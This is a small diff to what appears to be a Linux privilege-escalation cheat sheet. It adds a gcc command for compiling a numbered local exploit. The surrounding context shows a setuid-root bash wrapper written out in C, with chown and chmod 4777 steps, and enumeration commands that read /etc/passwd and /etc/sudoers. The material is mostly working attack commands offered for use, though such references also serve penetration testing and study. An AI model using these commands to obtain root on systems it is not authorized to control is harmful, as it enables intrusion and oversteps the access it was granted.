@@ -155,6 +155,9 @@ $ /usr/bin/foo
     If you can sudo chmod:
     * $echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c $ sudo chown root:root /tmp/setuid; sudo chmod 4777 /tmp/setuid; /tmp/setuid*
 
+   compile exploit fix error
+   *$ gcc 9545.c -o 9545 -Wl,--hash-style=both*
+
     Find other uses in the system
     * $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l*
 
